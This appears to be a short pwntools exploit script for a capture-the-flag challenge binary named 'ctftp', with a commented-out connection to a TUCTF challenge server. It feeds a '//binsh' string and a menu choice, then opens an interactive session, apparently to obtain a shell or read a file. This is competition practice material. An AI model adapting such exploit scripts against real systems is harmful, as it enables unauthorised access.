from pwn import *


e = ELF('ctftp')

p = process('ctftp')
#p = remote('chal.tuctf.com', 30500)

p.sendlineafter(': ', '//binsh')
p.sendlineafter('> ', '2')

p.sendlineafter(': ','c2.py')
p.interactive()